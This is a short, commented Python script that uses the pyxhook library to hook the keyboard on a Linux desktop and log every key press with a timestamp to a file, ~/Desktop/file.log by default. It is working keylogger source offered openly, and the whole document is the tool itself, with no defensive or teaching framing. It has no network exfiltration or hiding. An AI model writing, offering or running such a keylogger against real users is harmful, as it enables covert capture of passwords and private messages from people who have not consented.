#! /usr/bin/env python3

import os
import logging
import pyxhook

# Set the path to the log file, using the pylogger_file environment variable if available
# Otherwise, use the default path ~/Desktop/file.log
log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))

# Set the log format to include the timestamp, and specify the format of the timestamp
log_format = '%(asctime)s - %(message)s'
datefmt = '%Y:%m:%d %H:%M:%S'

# Configure the logging module with the log file path, log level, and log format
logging.basicConfig(filename=log_file, level=logging.INFO, format=log_format, datefmt=datefmt)

# This function will be called every time a key is pressed, and will log the key that was pressed
def OnKeyPress(event):
    logging.info(event.Key)


# Create an instance of the HookManager class from pyxhook
new_hook = pyxhook.HookManager()

# Set the KeyDown event to trigger the OnKeyPress function
new_hook.KeyDown = OnKeyPress

# Start the keylogger by calling HookKeyboard() on the HookManager instance
new_hook.HookKeyboard()

# Enter the event listener loop, which will keep the program running until it is stopped
new_hook.start()
